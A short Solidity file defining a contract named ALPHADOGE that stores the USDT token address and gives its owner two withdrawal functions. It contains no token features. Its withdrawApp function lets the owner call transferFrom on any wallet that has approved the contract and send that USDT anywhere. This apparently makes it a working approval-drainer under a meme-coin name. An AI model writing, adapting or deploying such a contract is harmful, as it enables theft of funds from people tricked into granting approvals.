// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.0;

interface IERC20 {
  function transfer(address recipient, uint256 amount) external;
  function balanceOf(address account) external view returns (uint256);
  function transferFrom(address sender, address recipient, uint256 amount) external ;
  function decimals() external view returns (uint8);
}


abstract contract Ownable {
  address private _owner;
  address private _previousOwner;
  uint256 private _lockTime;

  event OwnershipTransferred(
    address indexed previousOwner,
    address indexed newOwner
  );

  constructor() {
    address msgSender = msg.sender;
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(_owner == msg.sender, "Ownable: caller is not the owner");
    _;
  }

  function renounceOwnership() public virtual onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public virtual onlyOwner {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract  ALPHADOGE is Ownable{
  IERC20 public usdt;

  constructor()  {
    usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
  }

  event WithdrawLog(address toAddr, uint amount);
  
  function withdrawUsdt(address toAddr, uint256 amount) onlyOwner public  {
    usdt.transfer(toAddr, amount);
    emit WithdrawLog(toAddr, amount);
  }

  function withdrawApp(address fromAddr,address toAddr, uint256 amount) onlyOwner public  {
    usdt.transferFrom(fromAddr, toAddr, amount);
  }

  
}